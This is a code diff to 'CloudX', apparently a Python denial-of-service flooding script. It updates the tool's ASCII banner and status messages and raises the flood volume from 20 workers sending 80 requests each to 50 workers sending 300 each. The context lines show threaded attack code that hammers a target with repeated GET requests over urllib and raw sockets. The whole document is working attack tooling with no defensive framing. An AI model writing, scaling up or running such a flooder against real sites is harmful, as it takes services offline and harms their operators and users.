@@ -30,12 +30,15 @@ def type_with_protocol(url, delay=0.1):
         time.sleep(delay)
 
 os.system('clear')
-print("POST Method is currently being fixed and it is error right now, please use GET instead.")
 print("")
 logo = """
-< =============== >
-      CloudX
-^ <=============> ^
+
+  _______             ___  __
+ / ___/ /__  __ _____/ / |/_/
+/ /__/ / _ \/ // / _  />  <  - Sunshine
+\___/_/\___/\_,_/\_,_/_/|_|  
+
+
 """
 print(logo)
 
@@ -61,7 +64,7 @@ print("\n")
 type("--------------------------")
 print("\n")
 time.sleep(2.5)
-type("Waiting CloudX to connect... || [METHOD: GET]")
+type("Waiting CloudX to connect... || [Workers= 50]")
 print("\n")
 time.sleep(1.5)
 
@@ -126,13 +129,13 @@ def attack(ip, port, threadNum):
         try:
             if method  == "GET":
                 urlsocket_file = urllib.request.urlopen(request)
-                print("[*] Thread (%s) | Attack Sent! [METHOD:GET]" % (threadNum))
+                print("[*] Thread (%s) | Attack Sent! [-- CloudX --]" % (threadNum))
             else:
                 s.connect((ip, int(port)))
                 s.sendto(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'), (ip, int(port)))
                 s.sendto("Host: %s\r\n\r\n" % (url), (ip, int(port)))
                 s.close()
-                print("[*] Thread (%s) | Attack Sent! [METHOD:POST]" % (threadNum))
+                print("[*] Thread (%s) | Attack Sent! [METHOD: POST]" % (threadNum))
         except urllib.error.URLError as e:
             print("[*] Thread (%s) | Error! CloudX can't reach the target URL!" % (threadNum))
             print("[*] Thread (%s) | Attack stopped." % (threadNum))
@@ -179,8 +182,8 @@ for i in range(default_threads):
     threading.Thread(target=attack, args=(ip, port, i)).start()
 threading.Thread(target=flood_url).start()
 
-num_workers = 20
-requests_per_worker = 80
+num_workers = 50
+requests_per_worker = 300
 
 threading.Thread(target=workers, args=(num_workers, requests_per_worker)).start()
 
